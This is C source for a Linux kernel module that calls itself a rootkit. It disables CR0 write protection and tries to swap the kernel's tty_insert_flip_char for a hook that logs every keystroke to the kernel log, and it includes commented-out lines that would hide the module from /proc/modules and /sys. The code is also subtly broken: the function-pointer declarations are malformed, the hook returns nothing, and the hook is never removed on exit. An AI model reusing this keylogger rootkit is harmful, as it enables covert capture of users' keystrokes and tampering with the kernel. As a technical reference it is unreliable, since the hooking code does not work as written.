#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/tty.h>
#include <linux/tty_flip.h>
#include <linux/consolemap.h>

MODULE_LICENSE("Dual BSD/GPL");

#if defined(__i386__)
typedef unsigned int my_type;
#else
typedef unsigned long my_type;
#endif

static inline int (*o_tty_insert_flip_char)(struct tty_port *port, unsigned char ch, char flag);

static inline int (my_tty_insert_flip_char)(struct tty_port *port, unsigned char ch, char flag)
{
    printk("char: %d\n", ch);
    (*o_tty_insert_flip_char)(port, ch, flag);
}

static int _init(void) {
    printk("rootkit loaded\n");
    /*list_del_init(&__this_module.list);*/      /* /proc/modules */
    /*kobject_del(&THIS_MODULE->mkobj.kobj);*/   /* /sys/modules  */
    write_cr0(read_cr0() & (~ 0x10000));
    printk("tty_insert_flip_char: %p\n", tty_insert_flip_char);
    o_tty_insert_flip_char = (void *) xchg(tty_insert_flip_char, my_tty_insert_flip_char);
    write_cr0(read_cr0() | 0x10000);
    return 0;
}

static void _eexit(void) {
    write_cr0(read_cr0() & (~ 0x10000));
    /*xchg(tty_insert_flip_char, o_tty_insert_flip_char);*/
    write_cr0(read_cr0() | 0x10000);
    printk("rootkit removed\n");
}

module_init(_init);
module_exit(_eexit);
